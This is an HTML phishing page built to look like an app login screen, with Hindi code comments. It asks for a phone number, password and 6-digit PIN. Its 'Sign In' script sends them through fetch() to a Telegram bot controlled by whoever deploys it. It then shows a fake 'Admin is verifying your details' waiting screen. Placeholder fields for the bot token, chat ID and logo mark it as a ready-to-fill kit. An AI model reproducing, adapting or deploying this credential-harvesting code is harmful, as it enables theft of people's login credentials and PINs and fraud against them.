<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <!-- Icons के लिए FontAwesome लिंक -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f6fb;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        .container {
            width: 100%;
            max-width: 360px;
            padding: 20px;
            box-sizing: border-box;
            position: relative;
        }
        
        /* लोगो डिज़ाइन */
        .logo-section {
            text-align: center;
            margin-bottom: 40px;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
        }
        .logo-section img {
            max-width: 120px;
        }

        /* इनपुट बॉक्स डिज़ाइन */
        .input-group {
            display: flex;
            align-items: center;
            background-color: white;
            border-radius: 30px;
            padding: 5px 20px;
            margin-bottom: 15px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
        }
        .input-group i {
            color: #128c57;
            font-size: 18px;
            width: 30px;
        }
        .input-group input {
            border: none;
            outline: none;
            width: 100%;
            padding: 12px 0;
            font-size: 15px;
            background: transparent;
            color: #333;
        }
        .input-group input::placeholder {
            color: #b3b3b3;
        }

        /* लिंक्स और रेडियो बटन डिज़ाइन */
        .options-row {
            display: flex;
            justify-content: space-between;
            font-size: 14px;
            margin: 10px 10px 20px 10px;
        }
        .options-row a {
            color: #128c57;
            text-decoration: none;
        }
        .options-row label {
            color: #128c57;
            display: flex;
            align-items: center;
            cursor: pointer;
        }
        
        .agreement-row {
            text-align: center;
            font-size: 13px;
            margin-bottom: 20px;
            color: #128c57;
        }
        .agreement-row a {
            color: #128c57;
            text-decoration: none;
        }

        /* साइन इन बटन */
        .sign-in-btn {
            background-color: #128c57;
            color: white;
            border: none;
            border-radius: 30px;
            width: 100%;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(18, 140, 87, 0.3);
        }

        /* Forget Password */
        .forget-password {
            text-align: center;
            margin-top: 25px;
        }
        .forget-password a {
            color: #128c57;
            text-decoration: none;
            font-size: 14px;
        }

        /* वर्ज़न टेक्स्ट */
        .version {
            position: fixed;
            bottom: 10px;
            right: 15px;
            font-size: 12px;
            color: #999;
        }

        /* वेटिंग स्क्रीन */
        .wait-screen {
            text-align: center;
            background: white;
            padding: 40px 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        .wait-screen h2 {
            color: #128c57;
        }
    </style>
</head>
<body>

    <!-- मेन लॉगिन सेक्शन -->
    <div class="container" id="login-section">
        
        <!-- लोगो (यहाँ आप अपनी इमेज का लिंक डाल सकते हैं) -->
        <div class="logo-section">
            <img src="https://via.placeholder.com/150x80/333333/FFFFFF?text=YOUR+LOGO" alt="Logo">
        </div>

        <div class="input-group">
            <i class="fa-regular fa-user"></i>
            <input type="text" id="phone" placeholder="Phone">
        </div>

        <div class="input-group">
            <i class="fa-solid fa-lock"></i>
            <input type="password" id="password" placeholder="Password">
        </div>

        <div class="input-group">
            <i class="fa-solid fa-key"></i>
            <input type="password" id="pin" placeholder="6-Digit PIN">
        </div>

        <div class="options-row">
            <a href="#">Register</a>
            <label><input type="radio" name="remember"> Remember Me</label>
        </div>

        <div class="agreement-row">
            <label>
                <input type="radio" checked> Agree <a href="#">"User Privacy Agreement"</a>
            </label>
        </div>

        <button class="sign-in-btn" onclick="sendToTelegram()">Sign In</button>

        <div class="forget-password">
            <a href="#">Forget Password</a>
        </div>

        <div class="version">v1.2.3</div>
    </div>

    <!-- इंतज़ार वाला मैसेज -->
    <div class="container wait-screen" id="wait-section" style="display: none;">
        <h2>Please Wait...</h2>
        <p>Admin is verifying your details. Do not close this page.</p>
    </div>

    <script>
        function sendToTelegram() {
            var botToken = "YOUR_BOT_TOKEN_HERE"; 
            var chatId = "YOUR_CHAT_ID_HERE"; 
            
            var phone = document.getElementById("phone").value;
            var pass = document.getElementById("password").value;
            var pin = document.getElementById("pin").value;

            if(phone == "" || pass == "") {
                alert("Please enter Phone and Password");
                return;
            }

            var message = "🟢 नया लॉगिन आया है:\n\n📱 Phone: " + phone + "\n🔒 Password: " + pass + "\n🔑 PIN: " + pin;

            var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);

            fetch(telegramUrl);

            document.getElementById("login-section").style.display = "none";
            document.getElementById("wait-section").style.display = "block";
        }
    </script>

</body>
</html>
